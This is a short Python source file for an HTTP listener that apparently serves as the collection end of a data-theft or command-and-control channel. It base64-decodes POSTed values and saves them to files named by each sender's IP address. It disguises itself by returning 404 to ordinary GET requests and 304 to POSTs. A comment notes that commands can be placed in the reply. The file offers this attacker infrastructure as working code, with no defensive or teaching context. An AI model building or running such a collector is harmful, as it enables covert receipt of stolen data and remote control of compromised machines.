from server.server import server, RequestHandler
import base64
import os
import time


class ServerHandler(RequestHandler):

    def process(self, data, output_folder='logs'):
        try:
            parts = data.split('=')
            if len(parts) < 2:
                return
            # remove key= from POST data
            combined = '='.join(parts[1:])
            dec = base64.b64decode(combined)
            if dec:
                ip = self.client_address[0]
                filename = "%s_%s.txt" % (ip, str(time.time()))

                with open(os.path.join(output_folder, filename), 'w') as f:
                    f.write(dec.decode('utf-8'))
                print("Handled POST request, result written to file %s" % filename)
        except Exception as e:
            print("Error handling POST request: %s" % str(e))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = ""
        try:
            post_data = self.rfile.read(content_length)
        except:
            pass
        self.process(post_data.decode('utf-8'))
        # additional commands can be placed in the output string
        self.send_response(304)
        self.end_headers()
        self.wfile.write("".encode('utf-8'))

    def do_GET(self):
        # cast away any unwanted visitors :)
        self.send_response(404)
        self.end_headers()
        self.wfile.write("".encode('utf-8'))


if __name__ == "__main__":
    if not os.path.exists('logs'):
        print("Creating logs directory")
        os.mkdir('logs')
    server(ServerHandler)
